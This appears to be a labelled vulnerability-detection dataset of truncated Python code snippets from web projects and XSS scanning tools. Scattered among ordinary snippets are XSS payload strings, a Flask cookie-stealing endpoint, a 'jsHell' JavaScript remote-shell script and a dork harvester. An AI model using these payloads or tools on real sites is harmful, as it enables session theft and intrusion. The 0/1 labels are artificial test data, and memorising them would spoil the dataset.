url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups", "label": 0}, {"snippet_id": 42550, "code": " \t\t\t\t), list(d.values()) +[name]) \t\texcept Exception as e: \t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: \t\t\t\traise \tdef show_unique_validation_message", "label": 0}, {"snippet_id": 7336, "code": "==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view", "label": 0}, {"snippet_id": 12021, "code": "\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback", "label": 0}, {"snippet_id": 11913, "code": "(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki", "label": 0}, {"snippet_id": 28807, "code": "=server[10] \tssh=SSHClient() \tssh.load_system_host_keys() \tssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) \ttry: \t\tif ssh_enable==1: \t\t\tk=paramiko.RSAKey.from_private_key_file(ssh_key_name) \t\t", "label": 0}, {"snippet_id": 2580, "code": " post_vul_param +=key else: post_vul_param +=','+key if post_vul_param: dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": post_vul_param+\" are vulnerable to XSS\"}}) def xss_http_headers(url", "label": 0}, {"snippet_id": 39199, "code": ", convert_dates_to_str=False): \t\tdoc=self.get_valid_dict(convert_dates_to_str=convert_dates_to_str) \t\tdoc[\"doctype\"]=self.doctype \t\tfor df in self.meta.get_table_fields(): \t\t\tchildren=self.get(df.fieldname", "label": 0}, {"snippet_id": 51218, "code": " 'first_name', 'last_name', 'email', 'is_active', 'is_staff', 'is_superuser', 'last_login', 'in_groups') actions=[] @staticmethod def in_groups(obj): value=\"\" for group in obj.groups.all(): value +=group", "label": 0}, {"snippet_id": 51990, "code": " import ugettext as _ from desktop.lib.django_util import render from desktop.lib.exceptions_renderable import PopupException from desktop.lib.i18n import smart_str from desktop.lib.rest.http_client import", "label": 0}, {"snippet_id": 9192, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]", "label": 1}, {"snippet_id": 20002, "code": "() print 'Forums permissions/roles data has been seeded' except FixtureError: pass if self.serversonly: self.run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback): super(BokChoyTestSuite", "label": 0}, {"snippet_id": 31264, "code": " bokeh.models.widgets import Button, RadioButtonGroup, Select \timport pandas as pd \timport http.cookies \t\t \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid')\t ", "label": 0}, {"snippet_id": 49775, "code": "/cdnjs.cloudflare.com/ajax/libs/socket.io/2.1.1/socket.io.js\"></script> <script> ''' html=html+\"var socket=io.connect('http://{}:{}');\".format(HOST,PORT) html=html+''' try{setTimeout(` socket.emit('sendMSG", "label": 0}, {"snippet_id": 29163, "code": "+tmp_config_path+script +\" PROXY=\" +proxy+ \t\t\t\t\" HAPROXY_PATH=\"+haproxy_dir +\" VERSION=\"+ver] \t \terror=str(upload(serv, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \tos.system(\"rm -f %s", "label": 0}, {"snippet_id": 55022, "code": ".objects .filter(pk__in=changed_translation_pks) .prefetch_related('entity__resource') ) ] TranslationMemoryEntry.objects.bulk_create(memory_entries) @login_required(redirect_field_name='', login_url='/403'", "label": 0}, {"snippet_id": 10144, "code": "', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('", "label": 0}, {"snippet_id": 39825, "code": ") \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype \t\t\t\tif values: \t\t\t\t\tsetattr(self, df.fieldname, values.name) \t\t\t\t\tfor _df in fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus", "label": 0}, {"snippet_id": 49765, "code": " fucks!\" socketio=SocketIO(app) html=''' <div id=history></div> <script src=\"https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.1.1/socket.io.js\"></script> <script> ''' html=html+\"var socket=io.connect", "label": 0}, {"snippet_id": 21512, "code": "='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading", "label": 0}, {"snippet_id": 11503, "code": " url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$'", "label": 0}, {"snippet_id": 37664, "code": ")) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1", "label": 0}, {"snippet_id": 53782, "code": "[Input Dork] >_ \")) req=url.PoolManager() for page in range(4): send=req.request(\"GET\", \"http://www1.search-results.com/web?q=\" +user_dork +\"&page=\" +str(page)) parser=BeautifulSoup(send.data, features", "label": 1}, {"snippet_id": 25238, "code": " forms.Field, attrs=None): widgets=[] self.scheme=scheme self.field=field for fname, label, size in self.scheme['fields']: a=copy.copy(attrs) or{} a['data-fname']=fname widgets.append(self.widget(attrs=a))", "label": 0}, {"snippet_id": 9032, "code": "'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',", "label": 0}, {"snippet_id": 34302, "code": "(key)) \t\tfor key, value in iteritems(d): \t\t\tself.set(key, value) \t\treturn self \tdef update_if_missing(self, d): \t\tif isinstance(d, BaseDocument): \t\t\td=d.get_valid_dict() \t\tif \"doctype\" in d: \t\t\tself.set(", "label": 0}, {"snippet_id": 5192, "code": "</style>' % payload def input(self, payload): return '<input/onfocus=\"%s\"/autofocus>' % payload def marquee(self, payload): return '<marquee/onstart=\"%s\"></marquee>' % payload def div(self, payload): return", "label": 0}, {"snippet_id": 4077, "code": ".insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri", "label": 0}, {"snippet_id": 11752, "code": "\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i", "label": 0}, {"snippet_id": 52640, "code": ") elif node_data['type']=='pig': parameters=parameters.union(set(find_dollar_variables(data))) response['status']=0 response['parameters']=list(parameters) except Exception, e: response['message']=str(e", "label": 0}, {"snippet_id": 16274, "code": ", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile", "label": 0}, {"snippet_id": 4912, "code": "=\"javascript%26colon;alert(1)\">click', '<a href=javas& '<--`<img/src=` onerror=confirm``> --!>', '\\'\"</Script><Html Onmouseover=(confirm)()//' '<imG/sRc=l oNerrOr=(prompt)() x>', '<!--<iMg sRc=--><img src", "label": 0}, {"snippet_id": 38371, "code": "+\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post", "label": 0}, {"snippet_id": 51559, "code": ".config', 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ],", "label": 0}, {"snippet_id": 53646, "code": "['wf_%s_dir' % i]=request.fs.get_hdfs_path(wf_dir) coordinator=Coordinator(document=coord) coord_dir=Submission(request.user, coordinator, request.fs, request.jt, properties).deploy() deployment_mapping", "label": 0}, {"snippet_id": 46231, "code": "': LATEST.get(), 'engines': get_engines(request.user) }), 'is_owner': True, 'is_embeddable': request.GET.get('is_embeddable', False), 'can_edit_index': can_edit_index(request.user) }) def browse(request", "label": 0}, {"snippet_id": 17946, "code": "([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r", "label": 0}, {"snippet_id": 25212, "code": " get_format_without_seconds from pretix.presale.signals import question_form_fields logger=logging.getLogger(__name__) class NamePartsWidget(forms.MultiWidget): widget=forms.TextInput def __init__(self, scheme", "label": 0}, {"snippet_id": 53970, "code": ") app=Flask(__name__) @app.route('/') def index(): \treturn 'Hello ^_^' @app.route('/cookie',methods=['GET','POST']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values", "label": 0}, {"snippet_id": 39370, "code": "\t\t\t\t\t\t \t\t\t\t\t\tself.name=None \t\t\t\t\t\tself.db_insert() \t\t\t\t\t\treturn \t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif \"Duplicate\" in cstr(e.args[1]): \t\t\t\t\t \t\t\t\t\tself.show_unique_validation_message", "label": 0}, {"snippet_id": 6426, "code": " \"\"\" SSL private key filename(None==SSL disabled) \"\"\" return self.config.get(self.section, 'server_key') @property def cert_chain(self): \"\"\" SSL certificate chain filename \"\"\" return self.config.get(self", "label": 0}, {"snippet_id": 25514, "code": " code='required') if self.require_all_fields and not all(v for v in value): raise forms.ValidationError(self.error_messages['incomplete'], code='required') return value class BaseQuestionsForm(forms.Form)", "label": 0}, {"snippet_id": 1452, "code": "-Origin\"]=\"*\" return resp @app.route('/', defaults={'page': 'scan.html'}) @app.route('/<page>') def view_dashboard(page): return render_template('{}'.format(page)) app.run(host='0.0.0.0', port=8094,debug", "label": 0}, {"snippet_id": 39487, "code": "(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname))) \t\t \t\traise frappe.UniqueValidationError(self.doctype, self.name, e) \tdef update_modified(self", "label": 0}, {"snippet_id": 24443, "code": " False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY", "label": 0}, {"snippet_id": 2056, "code": ".update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text", "label": 0}, {"snippet_id": 36789, "code": "\t\t\telse: \t\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1)", "label": 0}, {"snippet_id": 23679, "code": "(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec", "label": 1}, {"snippet_id": 30074, "code": " master in MASTERS: \t\tif master[0] !=None: \t\t\tfunct.upload(master[0], cert_path, name) \ttry: \t\tfunct.upload(serv, cert_path, name) \texcept: \t\tpass \t \tos.system(\"mv %s %s\" %(name, cert_local_dir)) \tfunct", "label": 0}, {"snippet_id": 4349, "code": "\"\" url: xss payload url \"\"\" super(XSS, self).__init__() self.url=url @staticmethod def alterTest(self, p=False): return \"<script>alert(/xss/)</script>\" def img(self): return '<img/onerror=\"%s\"/src=x>' ", "label": 1}, {"snippet_id": 24659, "code": "=[ \"--with-xunit\", \"--xunit-file={}\".format(self.xunit_report), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a", "label": 0}, {"snippet_id": 17101, "code": "', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort", "label": 0}, {"snippet_id": 50566, "code": ".get('mode',[None])[0] if dmode=='init': return self.mode_init(request) elif dmode=='input': return self.mode_input(request) elif dmode=='receive': return self.mode_receive(request) elif dmode=='close'", "label": 0}, {"snippet_id": 35874, "code": ".label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content(self): \t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t-Ignore if 'Ignore XSS Filter' is checked or fieldtype is", "label": 0}, {"snippet_id": 21894, "code": "]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name", "label": 0}, {"snippet_id": 21280, "code": ", 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(", "label": 1}, {"snippet_id": 32157, "code": " None) if rules: rules=json.dumps(rules, indent=4) return safestring.mark_safe(rules) class MappingsTable(tables.DataTable): id=tables.Column('id', verbose_name=_('Mapping ID')) description=tables.Column", "label": 1}, {"snippet_id": 27990, "code": "\"Login page.\"\"\" @handler.unsupported_on_local_server @handler.get(handler.HTML) def get(self): \"\"\"Handle a get request.\"\"\" self.render( 'login.html',{ 'apiKey': local_config.ProjectConfig().get('firebase", "label": 0}, {"snippet_id": 29, "code": "().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact", "label": 0}, {"snippet_id": 20581, "code": "-depth-limit={depth} ' ).format( start_urls=' '.join(self.start_urls), allowed_domains='localhost', report_dir=self.pa11y_report_dir, reporter=\"1.0-json\", dont_go_here=\"logout\", depth=\"6\", ) return cmd_str", "label": 0}, {"snippet_id": 13576, "code": "'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views", "label": 0}, {"snippet_id": 19793, "code": " per above) and run tests with no setup or cleaning of environment test_spec -when set, specifies test files, classes, cases, etc. See platform doc. default_store -modulestore to use when running tests", "label": 0}, {"snippet_id": 15329, "code": " False) self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY", "label": 0}, {"snippet_id": 3046, "code": " from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path", "label": 0}, {"snippet_id": 37813, "code": ", post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"): \t\t\tpost.avatar=\"/\" +post", "label": 0}, {"snippet_id": 18827, "code": ".openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login", "label": 0}, {"snippet_id": 50542, "code": " such as initializing or sending/receving data through the request. It uses a long-polling mechanism to avoid sending data unless there is actual data available. Args: request(Request): Incoming request", "label": 0}, {"snippet_id": 35819, "code": " _validate_update_after_submit(self): \t\t \t\tdb_values=frappe.get_doc(self.doctype, self.name).as_dict() \t\tfor key in self.as_dict(): \t\t\tdf=self.meta.get_field(key) \t\t\tdb_value=db_values.get(key) \t\t\tif df and", "label": 0}, {"snippet_id": 33805, "code": ".form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}, \t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}] \telse: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"", "label": 1}, {"snippet_id": 12188, "code": "[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views", "label": 1}, {"snippet_id": 19942, "code": "'save_screenshots', False) def __enter__(self): super(BokChoyTestSuite, self).__enter__() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self", "label": 0}, {"snippet_id": 27878, "code": ")} logging.exception(exception) if helpers.should_render_json( self.request.headers.get('accept', ''), self.response.headers.get('Content-Type')): self.render_json(values, 500) else: self.render('error", "label": 0}, {"snippet_id": 21152, "code": "', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name", "label": 0}, {"snippet_id": 26931, "code": "=len(hidden_param_value)): for i in range(0,len(hidden_param_name)): post_params[hidden_param_name[i]]=hidden_param_value[i] if method.find(\"get\")==0: r=requests.get(url=furl, params=post_params) else: r", "label": 0}, {"snippet_id": 9772, "code": " settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+", "label": 0}, {"snippet_id": 44898, "code": "['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def gen_xml_workflow(request): response={'status': -1} try: workflow_json=json.loads(request.POST.get('workflow", "label": 0}, {"snippet_id": 15279, "code": " vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super(BokChoyTestSuite, self).__init__(*args, **kwargs", "label": 0}, {"snippet_id": 37166, "code": "\t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value", "label": 0}, {"snippet_id": 46527, "code": "['isOwner']=collection.doc.get().can_write(request.user) collections.append(massaged_collection) return JsonResponse(collections, safe=False) template='admin_collections.mako' if is_mobile: template='admin_collections_m", "label": 0}, {"snippet_id": 3065, "code": " path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): print \"response header\",res_headers['Content", "label": 0}, {"snippet_id": 48544, "code": " str=\"\" r: GroupReservation=None u: Profile=get_current_user(request) forward_url: str=default_foreward_url if request.GET.get(\"redirect\"): forward_url=request.GET[\"redirect\"] if \"srid\" in request.GET:", "label": 0}, {"snippet_id": 31360, "code": "\"templates/metrics_out.html\", mode='inline') \t\t \t\tx_min=df.index.min() -pd.Timedelta(hours=1) \t\tx_max=df.index.max() +pd.Timedelta(minutes=1) \t\tp[serv]=figure( \t\t\ttools=\"pan,box_zoom,reset,xwheel_zoom\",\t\t ", "label": 0}, {"snippet_id": 49722, "code": " Flask, render_template, session,request,flash,redirect,url_for import sys if len(sys.argv)<3: print \"Usage: python jShell.py IpAddress Port\\nExample: python jsHell.py 192.168.0.1 8080\" exit() PORT=sys.argv", "label": 1}, {"snippet_id": 20436, "code": "} cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\".format( urlencode({ \"course_id\": self", "label": 0}, {"snippet_id": 32322, "code": " if not path.startswith(top_level): print('%s is not under %s' %(args.file, args.directory)) return 1 rpath=os.path.relpath(path, top_level) url='%s/%s' %(origin, rpath) print('Opening %s' % url) thread", "label": 0}, {"snippet_id": 21407, "code": "[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', ", "label": 0}, {"snippet_id": 39945, "code": ", cstr(self.get(df.fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and value.startswith(\"_T-\")): \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta", "label": 0}, {"snippet_id": 5891, "code": ", payload): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>' % payload def input(self", "label": 1}, {"snippet_id": 18115, "code": "<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url", "label": 0}, {"snippet_id": 21984, "code": " url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>", "label": 0}, {"snippet_id": 31942, "code": "')+\"/\"+form.getvalue('color') \tlists=funct.get_files(dir=list, format=\"lst\") \tfor list in lists: \t\tprint(list) \t\t if form.getvalue('get_ldap_email'): \tusername=form.getvalue('get_ldap_email') \timport ldap", "label": 0}, {"snippet_id": 31397, "code": ".timestamp()*1000) \t\t\t) \t\t\t \t\thover=HoverTool( \t\t\ttooltips=[ \t\t\t\t(\"Connections\", \"@curr_con\"), \t\t\t\t(\"SSL connections\", \"@curr_ssl_con\"), \t\t\t\t(\"Sessions rate\", \"@sess_rate\") \t\t\t], \t\t\tmode='mouse' \t\t) \t\t \t\tp[serv", "label": 0}, {"snippet_id": 52282, "code": ".owner=request.user doc2.save() doc2.doc.all().delete() doc2.doc.add(copy_doc) workflow=Workflow(document=doc2) workflow.update_name(name) doc2.update_data({'workflow': workflow.get_data()['workflow']}", "label": 0}, {"snippet_id": 48016, "code": ".rights < 4: return redirect(\"/admin?error='You're not allowed to edit other users.'\") medium=Media.objects.get(pk=int(media_id)) user.avatarMedia=medium user.save() except Exception as e: return redirect(", "label": 0}, {"snippet_id": 19771, "code": " fasttest -when set, skip various set-up tasks(e.g., collectstatic) serversonly -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as", "label": 0}, {"snippet_id": 39893, "code": ".append((df.fieldname, docname, get_msg(df, docname))) \t\treturn invalid_links, cancelled_links \tdef _validate_selects(self): \t\tif frappe.flags.in_import: \t\t\treturn \t\tfor df in self.meta.get_select_fields", "label": 0}, {"snippet_id": 44606, "code": "(uuid__in=subworkflows) workflow_doc.dependencies=dependencies workflow_doc.update_data({'workflow': workflow}) workflow_doc.update_data({'layout': layout}) workflow_doc.name=workflow['name'] workflow_doc", "label": 0}, {"snippet_id": 38776, "code": ", filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key", "label": 0}, {"snippet_id": 31520, "code": "\tuser_id=cookie.get('uuid')\t \tservers=sql.select_waf_servers_metrics(user_id.value) \tservers=sorted(servers) \t \tp={} \tfor serv in servers: \t\tserv=serv[0] \t\tp[serv]={} \t\tmetric=sql.select_waf_metrics(serv) ", "label": 0}, {"snippet_id": 11908, "code": " urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile')", "label": 0}, {"snippet_id": 10866, "code": ".testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils.wait_for_test_servers() try: CourseFixture('foobar_org'", "label": 0}, {"snippet_id": 36381, "code": "/ default\"\"\" \t\tto_reset=[] \t\tfor df in high_permlevel_fields: \t\t\tif df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes: \t\t\t\tto_reset.append(df) \t\tif to_reset: \t\t\tif self.is_new", "label": 0}, {"snippet_id": 44426, "code": ".')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def copy_workflow(request): if request.method !='POST': raise PopupException(_('A POST request", "label": 0}, {"snippet_id": 22136, "code": " settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding", "label": 0}, {"snippet_id": 44201, "code": " PopupException from desktop.lib.i18n import smart_str from desktop.lib.rest.http_client import RestException from desktop.models import Document, Document2 from liboozie.credentials import Credentials", "label": 0}, {"snippet_id": 39650, "code": "(df.fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t\tfor fieldname in(\"parent\", \"parenttype\"): \t\t\t\tif not self.get(fieldname): \t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname", "label": 0}, {"snippet_id": 28862, "code": " connection: %s ' % sshException \t\tpass \texcept paramiko.BadHostKeyException as badHostKeyException: \t\treturn 'Unable to verify server\\'s host key: %s ' % badHostKeyException \t\tpass \texcept Exception as", "label": 0}, {"snippet_id": 49755, "code": "(__name__) app.secret_key='I Am Batman.' access_key=\"Tony Stark Is The Best.\" session_id=\"This guy fucks!\" socketio=SocketIO(app) html=''' <div id=history></div> <script src=\"https://cdnjs.cloudflare.com", "label": 0}, {"snippet_id": 51630, "code": " +DB_ENGINE), 'NAME': os.environ.get('DB_NAME', 'dashboard'), 'USER': os.environ.get('DB_USER', 'dashboard'), 'PASSWORD': os.environ.get('DB_PASSWORD', 'dashboard'), 'HOST': os.environ.get('DB_HOST', 'mysql", "label": 0}, {"snippet_id": 34733, "code": "\t\t \t\t\t\t\td[fieldname]=None \t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance", "label": 0}, {"snippet_id": 33063, "code": " toc_ul_li=toc_ul[0] ul_with_the_desired_toc_entries=toc_ul_li[1] else: ul_with_the_desired_toc_entries=toc_ul toc_node.remove(toc_ul) contents=ElementTree.SubElement(toc_node, 'h2') contents.text='Contents", "label": 0}, {"snippet_id": 22709, "code": "'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/", "label": 0}, {"snippet_id": 38770, "code": ": \t\t\treturn self.__dict__ \tdef getone(self, key, filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value", "label": 0}, {"snippet_id": 31559, "code": "\t\tdf=df.fillna(0) \t\tdf.index=pd.to_datetime(df.index) \t\tdf.index.name='Date' \t\tdf.sort_index(inplace=True) \t\tsource=ColumnDataSource(df) \t\t \t\toutput_file(\"templates/metrics_waf_out.html\", mode='inline'", "label": 0}, {"snippet_id": 10342, "code": "-xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', procs", "label": 0}, {"snippet_id": 43344, "code": "\t\t\t-Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code' \t\t\"\"\" \t\tif frappe.flags.in_install: \t\t\treturn \t\tfor fieldname, value in self.get_valid_dict().items(): \t\t\tif not value or not isinstance", "label": 0}, {"snippet_id": 9953, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL", "label": 0}, {"snippet_id": 4590, "code": "', 'form', 'frame', 'frameset', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'image', 'img', 'input', 'ins', 'isindex', 'kbd', 'keygen', 'label', 'layer'", "label": 0}, {"snippet_id": 46238, "code": "'is_owner': True, 'is_embeddable': request.GET.get('is_embeddable', False), 'can_edit_index': can_edit_index(request.user) }) def browse(request, name, is_mobile=False): engine=request.GET.get('engine',", "label": 0}, {"snippet_id": 37387, "code": "\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: ", "label": 0}, {"snippet_id": 